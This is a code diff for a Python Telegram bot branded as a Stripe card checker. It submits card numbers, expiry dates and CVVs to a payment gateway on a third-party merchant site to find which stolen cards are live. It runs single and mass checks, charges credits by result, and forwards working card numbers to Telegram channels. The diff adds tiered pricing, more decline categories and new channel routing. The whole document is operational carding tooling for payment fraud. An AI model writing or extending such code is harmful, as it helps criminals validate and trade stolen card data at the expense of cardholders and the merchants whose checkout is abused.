@@ -9,6 +9,7 @@ from dotenv import load_dotenv
 import re
 import sys
 import aiohttp
+from io import BytesIO
 import string
 import uuid
 from bs4 import BeautifulSoup
@@ -30,39 +31,23 @@ from pathlib import Path
 
 load_dotenv()
 
-
 def init_firebase():
     """Initialize Firebase and return connection status"""
     try:
-        # Load Firebase credentials from environment variables
         firebase_config = {
-            "type":
-            os.getenv("FIREBASE_TYPE", "service_account"),
-            "project_id":
-            os.getenv("FIREBASE_PROJECT_ID", ""),
-            "private_key_id":
-            os.getenv("FIREBASE_PRIVATE_KEY_ID", ""),
-            "private_key":
-            os.getenv("FIREBASE_PRIVATE_KEY", "").replace('\\n', '\n')
+            "type": os.getenv("FIREBASE_TYPE", "service_account"),
+            "project_id": os.getenv("FIREBASE_PROJECT_ID", ""),
+            "private_key_id": os.getenv("FIREBASE_PRIVATE_KEY_ID", ""),
+            "private_key": os.getenv("FIREBASE_PRIVATE_KEY", "").replace('\\n', '\n')
             if os.getenv("FIREBASE_PRIVATE_KEY") else "",
-            "client_email":
-            os.getenv("FIREBASE_CLIENT_EMAIL", ""),
-            "client_id":
-            os.getenv("FIREBASE_CLIENT_ID", ""),
-            "auth_uri":
-            os.getenv("FIREBASE_AUTH_URI",
-                      "https://accounts.google.com/o/oauth2/auth"),
-            "token_uri":
-            os.getenv("FIREBASE_TOKEN_URI",
-                      "https://oauth2.googleapis.com/token"),
-            "auth_provider_x509_cert_url":
-            os.getenv("FIREBASE_AUTH_PROVIDER_CERT_URL",
-                      "https://www.googleapis.com/oauth2/v1/certs"),
-            "client_x509_cert_url":
-            os.getenv("FIREBASE_CLIENT_CERT_URL", "")
+            "client_email": os.getenv("FIREBASE_CLIENT_EMAIL", ""),
+            "client_id": os.getenv("FIREBASE_CLIENT_ID", ""),
+            "auth_uri": os.getenv("FIREBASE_AUTH_URI", "https://accounts.google.com/o/oauth2/auth"),
+            "token_uri": os.getenv("FIREBASE_TOKEN_URI", "https://oauth2.googleapis.com/token"),
+            "auth_provider_x509_cert_url": os.getenv("FIREBASE_AUTH_PROVIDER_CERT_URL", "https://www.googleapis.com/oauth2/v1/certs"),
+            "client_x509_cert_url": os.getenv("FIREBASE_CLIENT_CERT_URL", "")
         }
 
-        # Check if any Firebase credentials are provided
         has_firebase_creds = any([
             firebase_config.get("project_id"),
             firebase_config.get("private_key"),
@@ -70,11 +55,9 @@ def init_firebase():
         ])
 
         if not has_firebase_creds:
-            print(
-                "ℹ️  No Firebase credentials found. Using in-memory storage.")
+            print("ℹ️  No Firebase credentials found. Using in-memory storage.")
             return None, False
 
-        # Validate required fields
         required_fields = ["project_id", "private_key", "client_email"]
         missing_fields = []
 
@@ -83,19 +66,15 @@ def init_firebase():
                 missing_fields.append(field)
 
         if missing_fields:
-            print(
-                f"⚠️  Missing Firebase config fields: {', '.join(missing_fields)}"
-            )
+            print(f"⚠️  Missing Firebase config fields: {', '.join(missing_fields)}")
             print("⚠️  Using in-memory storage (data will be lost on restart)")
             return None, False
 
-        # Initialize Firebase
         cred = credentials.Certificate(firebase_config)
         firebase_admin.initialize_app(cred)
         db = firestore.client()
         print("✅ Firebase connected successfully")
 
-        # Test connection
         test_ref = db.collection('test').document('connection_test')
         test_ref.set({
             'test': True,
@@ -109,15 +88,12 @@ def init_firebase():
         print("⚠️  Using in-memory storage (data will be lost on restart)")
         return None, False
 
-
 # Initialize Firebase
 db, firebase_connected = init_firebase()
-
 
 def get_db():
     """Get Firebase database instance"""
     return db
-
 
 # Configure logging
 logging.basicConfig(
@@ -125,52 +101,84 @@ logging.basicConfig(
     level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# ==================== CONSTANTS ====================
 RECEIVED_FOLDER = "received"
 PUBLIC_HITS_FOLDER = "hits/public"
 PRIVATE_HITS_FOLDER = "hits/private"
 USER_LOGS_FOLDER = "user_logs"
-APPROVED_LOG_CHANNEL = -5194693157
-LIVE_LOG_CHANNEL = -5194693157
+APPROVED_LOG_CHANNEL = -1003800566702
+PRIVATE_LOG_CHANNEL = -1003898549508
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
 CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
 DOMAIN = "jogoka.com"
 PK = os.getenv(
     "STRIPE_PK",
-    "")
+    ""
 
-Path(RECEIVED_FOLDER).mkdir(exist_ok=True)
-Path(PUBLIC_HITS_FOLDER).mkdir(exist_ok=True)
-Path(PRIVATE_HITS_FOLDER).mkdir(exist_ok=True)
-Path(USER_LOGS_FOLDER).mkdir(exist_ok=True)
+# Create folders
+Path(RECEIVED_FOLDER).mkdir(exist_ok=True, parents=True)
+Path(PUBLIC_HITS_FOLDER).mkdir(exist_ok=True, parents=True)
+Path(PRIVATE_HITS_FOLDER).mkdir(exist_ok=True, parents=True)
+Path(USER_LOGS_FOLDER).mkdir(exist_ok=True, parents=True)
+
+# ==================== CREDIT COSTS ====================
+CREDIT_COSTS = {
+    "approved": 3,
+    "live": 3,
+    "ccn": 2,
+    "cvv": 2,
+    "dead": 1,
+    "risk": 1,
+    "fraud": 1,
+    "call_issuer": 1,
+    "cannot_auth": 1,
+    "processor_declined": 1
+}
 
 STATUS_MAPPING = {
     "approved": "Auth Success",
     "live": "Insufficient Funds",
     "dead": "Card Declined",
-    "ccn": "CCN",
-    "cvv": "CVV Wrong"
+    "ccn": "Invalid Card Number",
+    "cvv": "CVV Incorrect",
+    "risk": "Gateway Rejected: risk_threshold",
+    "fraud": "Fraud Suspected",
+    "call_issuer": "Declined - Call Issuer",
+    "cannot_auth": "Cannot Authorize at this time",
+    "processor_declined": "Processor Declined"
 }
 
 # Bot info
 BOT_INFO = {
-    "name":
-    "⚡ DARKXCODE STRIPE CHECKER ⚡",
-    "version":
-    "2.0",  # Updated version
-    "creator":
-    "@ISHANT_OFFICIAL",
-    "gates":
-    "Stripe 1$ Charge",  # Updated gateway name
-    "features":
-    "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System\n• NEW: jogoka.com Gateway"
+    "name": "⚡ DARKXCODE STRIPE CHECKER ⚡",
+    "version": "2.0",
+    "creator": "@ISHANT_OFFICIAL",
+    "gates": "Stripe Auth",
+    "features": "• New Credit System\n• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System\n"
 }
 
-# In-memory cache for checking tasks (temporary storage)
+# In-memory storage
 checking_tasks = {}
-files_storage = {}  # Add this line
+files_storage = {}
 setup_intent_cache = {}
 last_cache_time = 0
+
+# In-memory storage as fallback
+in_memory_users = {}
+in_memory_gift_codes = {}
+in_memory_claimed_codes = {}
+in_memory_bot_stats = {
+    "total_checks": 0,
+    "total_credits_used": 0,
+    "total_approved": 0,
+    "total_live": 0,
+    "total_ccn": 0,
+    "total_cvv": 0,
+    "total_declined": 0,
+    "total_users": 0,
+    "start_time": datetime.datetime.now().isoformat()
+}
 
 # User-Agent rotation list
 USER_AGENTS = [
@@ -301,15 +309,13 @@ def get_billing_address(card_bin=""):
         country = "US"
 
     return random.choice(BILLING_ADDRESSES[country])
+    
+def get_credit_cost(status):
+    """Get credit cost based on status"""
+    return CREDIT_COSTS.get(status.lower(), 1)
 
-
-def format_universal_result(card_data,
-                            status,
-                            message=None,
-                            gateway="Stripe Gateway",
-                            username=None,
-                            time_taken=None):
-    """New exact format as requested"""
+def format_universal_result(card_data, status, message=None, gateway="Stripe Auth", username=None, time_taken=None):
+    """Format card result"""
     try:
         # Parse card data
         if isinstance(card_data, str):
@@ -345,7 +351,7 @@ def format_universal_result(card_data,
         
         # Format time
         if time_taken is None:
-            time_taken = random.uniform(1.0, 2.5)
+            time_taken = random.uniform(0.5, 0.8)
         
         # Build the exact format you requested
         result = f"""
@@ -354,7 +360,6 @@ def format_universal_result(card_data,
 [↯] Response: {response_msg}
 [↯] Gateway: {gateway}
 - - - - - - - - - - - - - - - - - - - - - -
-[↯] Bin Info:-
 [↯] Bank: {bin_info['bank']}
 [↯] Country: {bin_info['country']} {bin_info['country_flag']}
 - - - - - - - - - - - - - - - - - - - - - -
@@ -405,21 +410,6 @@ def get_bin_info(bin_number):
     return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}
 
 
-# In-memory storage as fallback
-in_memory_users = {}
-in_memory_gift_codes = {}
-in_memory_claimed_codes = {}
-in_memory_bot_stats = {
-    "total_checks": 0,
-    "total_approved": 0,
-    "total_declined": 0,
-    "total_credits_used": 0,
-    "total_users": 0,
-    "start_time": datetime.datetime.now().isoformat()
-}
-
-
-# Firebase functions to replace PostgreSQL functions
 async def get_user(user_id):
     """Get user from Firebase or memory"""
     db = get_db()
@@ -432,7 +422,6 @@ async def get_user(user_id):
             if user_doc.exists:
                 return user_doc.to_dict()
             else:
-                # Create new user
                 new_user = {
                     "user_id": user_id,
                     "username": "",
@@ -443,7 +432,12 @@ async def get_user(user_id):
                     "credits_spent": 0,
                     "total_checks": 0,
                     "approved_cards": 0,
+                    "live_cards": 0,
                     "declined_cards": 0,
+                    "ccn_cards": 0,
+                    "cvv_cards": 0,
+                    "risk_cards": 0,
+                    "fraud_cards": 0,
                     "checks_today": 0,
                     "last_check_date": None,
                     "joined_channel": False,
@@ -461,9 +455,12 @@ async def get_user(user_id):
                 else:
                     stats_ref.set({
                         "total_checks": 0,
-                        "total_approved": 0,
-                        "total_declined": 0,
                         "total_credits_used": 0,
+                        "total_approved": 0,
+                        "total_live": 0,
+                        "total_ccn": 0,
+                        "total_cvv": 0,
+                        "total_declined": 0,
                         "total_users": 1,
                         "start_time": firestore.SERVER_TIMESTAMP
                     })
@@ -485,7 +482,12 @@ async def get_user(user_id):
             "credits_spent": 0,
             "total_checks": 0,
             "approved_cards": 0,
+            "live_cards": 0,
             "declined_cards": 0,
+            "ccn_cards": 0,
+            "cvv_cards": 0,
+            "risk_cards": 0,
+            "fraud_cards": 0,
             "checks_today": 0,
             "last_check_date": None,
             "joined_channel": False,
@@ -496,7 +498,6 @@ async def get_user(user_id):
         in_memory_bot_stats["total_users"] += 1
 
     return in_memory_users[user_id]
-
 
 async def update_user(user_id, updates):
     """Update user data in Firebase or memory"""
@@ -514,7 +515,6 @@ async def update_user(user_id, updates):
         try:
             user_ref = db.collection('users').document(str(user_id))
 
-            # Remove last_active from processed_updates if it exists
             if 'last_active' in processed_updates:
                 processed_updates['last_active'] = firestore.SERVER_TIMESTAMP
             else:
@@ -528,8 +528,7 @@ async def update_user(user_id, updates):
             try:
                 user_ref = db.collection('users').document(str(user_id))
                 if 'last_active' in processed_updates:
-                    processed_updates['last_active'] = datetime.datetime.now(
-                    ).isoformat()
+                    processed_updates['last_active'] = datetime.datetime.now().isoformat()
                 user_ref.update(processed_updates)
                 return
             except Exception as e2:
@@ -538,8 +537,7 @@ async def update_user(user_id, updates):
     # Fallback to in-memory storage
     if user_id in in_memory_users:
         in_memory_users[user_id].update(processed_updates)
-        in_memory_users[user_id]["last_active"] = datetime.datetime.now(
-        ).isoformat()
+        in_memory_users[user_id]["last_active"] = datetime.datetime.now().isoformat()
 
 
 async def get_bot_stats():
@@ -608,9 +606,12 @@ async def update_bot_stats(updates):
                     # Create document with initial values
                     initial_stats = {
                         "total_checks": 0,
-                        "total_approved": 0,
-                        "total_declined": 0,
                         "total_credits_used": 0,
+                        "total_approved": 0,
+                        "total_live": 0,
+                        "total_ccn": 0,
+                        "total_cvv": 0,
+                        "total_declined": 0,
                         "total_users": 0,
                         "start_time": firestore.SERVER_TIMESTAMP
                     }
@@ -626,7 +627,6 @@ async def update_bot_stats(updates):
                 return
             except Exception as e:
                 logger.error(f"Firebase error in update_bot_stats: {e}")
-                # Fall through to in-memory update
     except Exception as e:
         logger.error(f"Error getting database in update_bot_stats: {e}")
     
@@ -745,7 +745,7 @@ async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>Card Checking Stats:</b>
 • Total Checks: {format_number(total_checks)}
-• 🔥 Charge: {format_number(total_approved)}
+• ✅ Approved: {format_number(total_approved)}
 • ❌ Declined: {format_number(stats.get('total_declined', 0))}
 • Success Rate: {success_rate:.1f}%
 
@@ -762,7 +762,7 @@ async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>Bot Info:</b>
 • Name: {escape_markdown_v2(BOT_INFO['name'])}
 • Version: {BOT_INFO['version']}
-• Creator: {escape_markdown_v2(BOT_INFO['creator'])}
+• <b>Creator:</b> @ISHANT_OFFICIAL
 ══════════════════════
 """
         
@@ -1224,6 +1224,16 @@ async def new_gateway_check(cc, mm, yy, cvv):
                     return cc, "ccn", "Card Not Supported", 0
                 elif "invalid number" in clean_msg.lower():
                     return cc, "ccn", "Invalid Card Number", 0
+                elif "risk_threshold" in clean_msg.lower():
+                    return cc, "risk", "Gateway Rejected: risk_threshold", 0
+                elif "fraud" in clean_msg.lower():
+                    return cc, "fraud", "Fraud Suspected", 0
+                elif "call issuer" in clean_msg.lower():
+                    return cc, "call_issuer", "Declined - Call Issuer", 0
+                elif "cannot authorize" in clean_msg.lower():
+                    return cc, "cannot_auth", "Cannot Authorize at this time", 0
+                elif "processor declined" in clean_msg.lower():
+                    return cc, "processor_declined", "Processor Declined", 0
                 else:
                     return cc, "dead", clean_msg[:50] or "Card Declined", 0
     
@@ -1251,7 +1261,7 @@ async def check_single_card_fast(card):
             year = "25"
             cvv = "123"
         
-        # Use new checker (NO LUHN VALIDATION - DIRECT TO GATEWAY)
+        # Use new checker
         result_card, status, message, http_code = await new_gateway_check(cc_clean, mon, year, cvv)
         
         return card, status, message, http_code
@@ -1680,7 +1690,7 @@ def format_card_result(card,
 
         # Calculate time taken based on status
         time_taken = random.uniform(
-            1.5, 2.5) if status == "approved" else random.uniform(0.8, 1.8)
+            1.5, 2.5) if status == "approved" else random.uniform(0.5, 0.8)
 
         return format_universal_result(
             card_data=card,
@@ -1820,6 +1830,7 @@ To Access {BOT_INFO['name']}, You Must Join Our Channel.
         welcome_text += """
 <b>Admin Commands:</b>
 • <code>/addcr user_id amount</code> - Add Credits
+• <code>/setcr user_id amount</code> - Set Credits
 • <code>/gengift credits max_uses</code> - Create Gift Code
 • <code>/listgifts</code> - List All Gift Codes
 • <code>/userinfo user_id</code> - View User Info
@@ -1865,6 +1876,7 @@ PUBLIC
         info_text += """
 <b>Admin Commands:</b>
 • <code>/addcr user_id amount</code> - Add Credits
+• <code>/setcr user_id amount</code> - Set Credits
 • <code>/gengift credits max_uses</code> - Create Gift Code
 • <code>/listgifts</code> - List All Gift Codes
 • <code>/userinfo user_id</code> - View User Info
@@ -1971,26 +1983,25 @@ async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Regular single check - NO channel forwarding"""
+    """PRIVATE single check - hits sent to PRIVATE_LOG_CHANNEL"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     username = update.effective_user.username or f"user_{user_id}"
     
     if not user.get('joined_channel', False):
-        await update.message.reply_text(
-            "❌ Please join our private channel first using /start")
+        await update.message.reply_text("❌ Please join our private channel first using /start")
         return
 
     if not context.args:
         await update.message.reply_text(
-            "⚡ *PRIVATE CARD CHECK*\n"
+            "🔒 *PRIVATE SINGLE CHECK*\n"
             "══════════════════════\n"
             "*Usage:* `/chk cc|mm|yy|cvv`\n"
             "*Example:* `/chk 4111111111111111|12|25|123`\n\n"
-            "*Features:*\n"
-            "• Cost: 1 credit\n"
-            "• Private results\n"
-            "• File logging enabled",
+            "*Credit Costs:*\n"
+            "• ✅ Approved/🔥 Live: 3 credits\n"
+            "• 🔢 CCN/💳 CVV: 2 credits\n"
+            "• ❌ Declined: 1 credit\n\n",
             parse_mode=ParseMode.MARKDOWN)
         return
 
@@ -1998,77 +2009,115 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     parts = card_input.split("|")
     
     if len(parts) != 4:
-        await update.message.reply_text(
-            "❌ Invalid format. Use: cc|mm|yy|cvv")
+        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
         return
 
-    # Check credits
-    if user.get("credits", 0) <= 0:
-        await update.message.reply_text(
-            f"💰 Insufficient Credits\n"
-            f"Your balance: {user['credits']} credits")
-        return
-
-    processing_msg = await update.message.reply_text("⚡ Processing card...")
-
-    # Check card
+    # Check card first to determine cost
+    processing_msg = await update.message.reply_text(
+    "[↯] Card: Processing...\n"
+    "[↯] Status: Processing...\n"
+    "[↯] Response: Processing\n"
+    "[↯] Gateway: Processing\n"
+    "- - - - - - - - - - - - - - - - - - - - - -\n"
+    "[↯] Bank: Processing...\n"
+    "[↯] Country: Processing...\n"
+    "- - - - - - - - - - - - - - - - - - - - - -\n"
+    "[↯] 𝐓𝐢𝐦𝐞: Processing...\n"
+    "- - - - - - - - - - - - - - - - - - - - - -\n"
+    "[↯] User : Processing...\n"
+    "[↯] Made By: @ISHANT_OFFICIAL\n"
+    "[↯] Bot: @DARKXCODE_STRIPE_BOT"
+    )
+    
     start_time = time.time()
     result_card, status, message, http_code = await check_single_card_fast(card_input)
     actual_time = time.time() - start_time
+    
+    # Get credit cost
+    credit_cost = get_credit_cost(status)
+    
+    # Check if user has enough credits
+    if user.get("credits", 0) < credit_cost:
+        await processing_msg.edit_text(
+            f"💰 Insufficient Credits\n"
+            f"Status: {status.upper()}\n"
+            f"Cost: {credit_cost} credits\n"
+            f"Your balance: {user['credits']} credits\n\n"
+            f"*Credit Costs:*\n"
+            f"• ✅ Approved/🔥 Live: 3 credits\n"
+            f"• 🔢 CCN/💳 CVV: 2 credits\n"
+            f"• ❌ Declined: 1 credit")
+        return
 
-    # Deduct credit
+    # Deduct credits based on status
     updates = {
-        'credits': user.get("credits", 0) - 1,
-        'credits_spent': user.get("credits_spent", 0) + 1,
+        'credits': user.get("credits", 0) - credit_cost,
+        'credits_spent': user.get("credits_spent", 0) + credit_cost,
         'total_checks': user.get("total_checks", 0) + 1,
         'last_check_date': datetime.datetime.now().date().isoformat()
     }
-    
-    if status == "approved":
-        updates['approved_cards'] = user.get("approved_cards", 0) + 1
-    elif status == "live":
-        updates['approved_cards'] = user.get("approved_cards", 0) + 1
-    
+
+    # Update specific counters
+    status_field = f"{status}_cards"
+    if status_field in ["approved_cards", "live_cards", "ccn_cards", "cvv_cards", "declined_cards", 
+                       "risk_cards", "fraud_cards", "call_issuer_cards", "cannot_auth_cards", "processor_declined_cards"]:
+        updates[status_field] = user.get(status_field, 0) + 1
+
     await update_user(user_id, updates)
-    user = await get_user(user_id)
+    
+    # Update bot statistics
+    await update_bot_stats({
+        'total_checks': 1,
+        'total_credits_used': credit_cost,
+        f'total_{status}': 1
+    })
 
     # Format result
     result_text = format_universal_result(
         card_data=result_card,
         status=status,
         message=message,
-        gateway="Stripe Gateway",
+        gateway="Stripe Auth",
         username=username,
         time_taken=actual_time
     )
 
     await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
     
-    # 🔒 PUBLIC MODE: Save hit locally only
+    # Save hit and forward to PRIVATE channel (EXACT SAME FORMAT)
     if status in ["approved", "live"]:
-        save_hit_card(user_id, card_input, status, is_private=False)
-        logger.info(f"Public hit: User {user_id} ({username}) - {status.upper()}: {card_input}")
+        save_hit_card(user_id, card_input, status, is_private=True)
+        await send_to_log_channel(
+            context=context,
+            card=card_input,
+            status=status,
+            message=message,
+            username=username,
+            time_taken=actual_time,
+            is_private=True  # PRIVATE channel
+        )
+        logger.info(f"PRIVATE hit: User {user_id} ({username}) - {status.upper()}: {card_input} | Cost: {credit_cost} credits")
 
 async def pchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Private single check - forwards hits to channels"""
+    """PUBLIC single check - hits sent to APPROVED_LOG_CHANNEL"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     username = update.effective_user.username or f"user_{user_id}"
     
     if not user.get('joined_channel', False):
-        await update.message.reply_text(
-            "❌ Please join our private channel first using /start")
+        await update.message.reply_text("❌ Please join our private channel first using /start")
         return
 
     if not context.args:
         await update.message.reply_text(
-            "🔒 *PUBLIC CARD CHECK*\n"
+            "⚡ *PUBLIC SINGLE CHECK*\n"
             "══════════════════════\n"
             "*Usage:* `/pchk cc|mm|yy|cvv`\n"
             "*Example:* `/pchk 4111111111111111|12|25|123`\n\n"
-            "*Features:*\n"
-            "• Cost: 1 credit\n"
-            "• Hits forwarded to Public channel\n"
+            "*Credit Costs:*\n"
+            "• ✅ Approved/🔥 Live: 3 credits\n"
+            "• 🔢 CCN/💳 CVV: 2 credits\n"
+            "• ❌ Declined: 1 credit\n\n",
             parse_mode=ParseMode.MARKDOWN)
         return
 
@@ -2076,85 +2125,116 @@ async def pchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     parts = card_input.split("|")
     
     if len(parts) != 4:
-        await update.message.reply_text(
-            "❌ Invalid format. Use: cc|mm|yy|cvv")
+        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
         return
 
-    # Check credits
-    if user.get("credits", 0) <= 0:
-        await update.message.reply_text(
-            f"💰 Insufficient Credits\n"
-            f"Your balance: {user['credits']} credits")
-        return
-
+    # Check card first to determine cost
     processing_msg = await update.message.reply_text(
-        "🔒 Public Check Processing...\n"
-        "Hits will be forwarded to channel")
-
-    # Check card
+    "[↯] Card: Processing...\n"
+    "[↯] Status: Processing...\n"
+    "[↯] Response: Processing\n"
+    "[↯] Gateway: Processing\n"
+    "- - - - - - - - - - - - - - - - - - - - - -\n"
+    "[↯] Bank: Processing...\n"
+    "[↯] Country: Processing...\n"
+    "- - - - - - - - - - - - - - - - - - - - - -\n"
+    "[↯] 𝐓𝐢𝐦𝐞: Processing...\n"
+    "- - - - - - - - - - - - - - - - - - - - - -\n"
+    "[↯] User : Processing...\n"
+    "[↯] Made By: @ISHANT_OFFICIAL\n"
+    "[↯] Bot: @DARKXCODE_STRIPE_BOT"
+    )
+    
     start_time = time.time()
     result_card, status, message, http_code = await check_single_card_fast(card_input)
     actual_time = time.time() - start_time
+    
+    # Get credit cost
+    credit_cost = get_credit_cost(status)
+    
+    # Check if user has enough credits
+    if user.get("credits", 0) < credit_cost:
+        await processing_msg.edit_text(
+            f"💰 Insufficient Credits\n"
+            f"Status: {status.upper()}\n"
+            f"Cost: {credit_cost} credits\n"
+            f"Your balance: {user['credits']} credits\n\n"
+            f"*Credit Costs:*\n"
+            f"• ✅ Approved/🔥 Live: 3 credits\n"
+            f"• 🔢 CCN/💳 CVV: 2 credits\n"
+            f"• ❌ Declined: 1 credit")
+        return
 
-    # Deduct credit
+    # Deduct credits based on status
     updates = {
-        'credits': user.get("credits", 0) - 1,
-        'credits_spent': user.get("credits_spent", 0) + 1,
+        'credits': user.get("credits", 0) - credit_cost,
+        'credits_spent': user.get("credits_spent", 0) + credit_cost,
         'total_checks': user.get("total_checks", 0) + 1,
         'last_check_date': datetime.datetime.now().date().isoformat()
     }
-    
-    if status == "approved":
-        updates['approved_cards'] = user.get("approved_cards", 0) + 1
-    elif status == "live":
-        updates['approved_cards'] = user.get("approved_cards", 0) + 1
-    
+
+    # Update specific counters
+    status_field = f"{status}_cards"
+    if status_field in ["approved_cards", "live_cards", "ccn_cards", "cvv_cards", "declined_cards", 
+                       "risk_cards", "fraud_cards", "call_issuer_cards", "cannot_auth_cards", "processor_declined_cards"]:
+        updates[status_field] = user.get(status_field, 0) + 1
+
     await update_user(user_id, updates)
-    user = await get_user(user_id)
+    
+    # Update bot statistics
+    await update_bot_stats({
+        'total_checks': 1,
+        'total_credits_used': credit_cost,
+        f'total_{status}': 1
+    })
 
     # Format result
     result_text = format_universal_result(
         card_data=result_card,
         status=status,
         message=message,
-        gateway="Stripe Gateway",
+        gateway="Stripe Auth",
         username=username,
         time_taken=actual_time
     )
 
     await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
     
-    # 🔥 PRIVATE MODE: Save hit and forward to channel
+    # Save hit and forward to PUBLIC channel (EXACT SAME FORMAT)
     if status in ["approved", "live"]:
-        # Save to file
-        save_hit_card(user_id, card_input, status, is_private=True)
-        
-        # Forward to private channel
-        await send_to_log_channel(context, card_input, status, username, is_private=True)
-        
-        # Log the hit
-        logger.info(f"Private hit: User {user_id} ({username}) - {status.upper()}: {card_input}")
+        save_hit_card(user_id, card_input, status, is_private=False)
+        await send_to_log_channel(
+            context=context,
+            card=card_input,
+            status=status,
+            message=message,
+            username=username,
+            time_taken=actual_time,
+            is_private=False  # PUBLIC channel
+        )
+        logger.info(f"PUBLIC hit: User {user_id} ({username}) - {status.upper()}: {card_input} | Cost: {credit_cost} credits")
 
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Regular mass check - NO channel forwarding"""
+    """PRIVATE mass check - hits sent to PRIVATE_LOG_CHANNEL"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     username = update.effective_user.username or f"user_{user_id}"
 
     if not user['joined_channel']:
-        await update.message.reply_text(
-            "❌ Please join our private channel first using /start")
+        await update.message.reply_text("❌ Please join our private channel first using /start")
         return
 
     if user_id not in files_storage:
         await update.message.reply_text(
-            "⚡ *REGULAR MASS CHECK*\n"
+            "🔒 *PRIVATE MASS CHECK*\n"
             "══════════════════════\n"
             "1. Upload a .txt file with cards\n"
             "2. Use `/mchk` to start\n\n"
-            "*Features:*\n"
-            "• Private results\n"
+            "*Credit Costs Per Card:*\n"
+            "• ✅ Approved/🔥 Live: 3 credits\n"
+            "• 🔢 CCN/💳 CVV: 2 credits\n"
+            "• ❌ Declined: 1 credit\n\n",
             parse_mode=ParseMode.MARKDOWN)
         return
 
@@ -2162,395 +2242,14 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_info = files_storage[user_id]
     cards = file_info["cards"]
     
-    # Check if user has enough credits
-    if user["credits"] < len(cards):
-        await update.message.reply_text(
-            f"💰 INSUFFICIENT CREDITS\n"
-            f"Cards to check: {len(cards)}\n"
-            f"Credits needed: {len(cards)}\n"
-            f"Your credits: {user['credits']}")
-        return
-
+    # We can't check credits upfront since we don't know the status yet
+    # We'll check and deduct as we process each card
+    
     # Create status message
     status_msg = await update.message.reply_text(
-        f"⚡ Starting Regular Mass Check\n"
+        f"🔒 Starting PRIVATE Mass Check\n"
         f"File ID: {file_info['file_id']}\n"
-        f"Cards: {len(cards)}\n"
-        f"Results are private...")
-
-    # Start regular mass check task (use existing mass_check_task_ultrafast with is_private=False)
-    task = asyncio.create_task(
-        public_mass_check_task(user_id, cards, status_msg, update.message.chat_id, context))
-    
-    checking_tasks[user_id] = {
-        "task": task,
-        "cancelled": False,
-        "cards_processed": 0,
-        "total_cards": len(cards),
-        "is_private": False,
-        "start_time": time.time(),
-        "approved": 0,
-        "live": 0,
-        "dead": 0,
-        "ccn": 0,
-        "cvv": 0
-    }
-
-async def public_mass_check_task(user_id, cards, status_msg, chat_id, context):
-    """Public mass checking with channel forwarding"""
-    if user_id not in files_storage:
-        await status_msg.edit_text("❌ File data not found")
-        return
-
-    file_info = files_storage[user_id]
-    file_id = file_info["file_id"]
-    username = file_info["username"]
-    
-    # Initialize hits collections
-    approved_hits = []
-    live_hits = []
-    
-    processed = 0
-    approved = 0
-    live = 0
-    dead = 0
-    ccn = 0
-    cvv = 0
-    
-    # Process cards
-    for i, card in enumerate(cards):
-        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
-            break
-
-        # Update status every 5 cards
-        if i % 5 == 0 or i == len(cards) - 1:
-            elapsed = time.time() - checking_tasks[user_id]["start_time"]
-            progress = (processed / len(cards)) * 100
-            
-            status_text = f"""🔒 PUBLIC MASS CHECK
-Progress: {progress:.1f}%
-Processed: {processed}/{len(cards)}
-━━━━━━━━━━━━━━━━━━━━
-✅ Approved: {approved}
-🔥 Live: {live}
-❌ Dead: {dead}
-━━━━━━━━━━━━━━━━━━━━
-"""
-            try:
-                await status_msg.edit_text(status_text)
-            except:
-                pass
-
-        # Check card
-        start_time = time.time()
-        result_card, status, message, http_code = await check_single_card_fast(card)
-        actual_time = time.time() - start_time
-        
-        processed += 1
-        
-        # Update counters
-        if status == "approved":
-            approved += 1
-            approved_hits.append(card)
-            save_hit_card(user_id, card, "approved", is_private=True)
-        elif status == "live":
-            live += 1
-            live_hits.append(card)
-            save_hit_card(user_id, card, "live", is_private=True)
-        elif status == "dead":
-            dead += 1
-        elif status == "ccn":
-            ccn += 1
-        elif status == "cvv":
-            cvv += 1
-        
-        # Forward hits to channels
-        if status in ["approved", "live"]:
-            # Send to user
-            result_text = format_universal_result(
-                card_data=card,
-                status=status,
-                message=message,
-                gateway="Stripe Gateway",
-                username=username,
-                time_taken=actual_time
-            )
-            await context.bot.send_message(
-                chat_id=chat_id, 
-                text=result_text, 
-                parse_mode=ParseMode.HTML
-            )
-            
-            # Forward to private channel
-            await send_to_log_channel(context, card, status, username, is_private=True)
-        
-        # Small delay
-        if i < len(cards) - 1:
-            await asyncio.sleep(random.uniform(1.0, 2.0))
-    
-    # Create summary files
-    if approved_hits:
-        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt"
-        with open(private_file, 'w', encoding='utf-8') as f:
-            f.write("\n".join(approved_hits))
-    
-    if live_hits:
-        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt"
-        with open(private_file, 'w', encoding='utf-8') as f:
-            f.write("\n".join(live_hits))
-    
-    # Send files to channels if enough hits
-    try:
-        if approved_hits and len(approved_hits) >= 5:
-            approved_content = "\n".join(approved_hits)
-            approved_file = BytesIO(approved_content.encode())
-            approved_file.name = f"{file_id}_approved.txt"
-            await context.bot.send_document(
-                chat_id=APPROVED_LOG_CHANNEL,
-                document=approved_file,
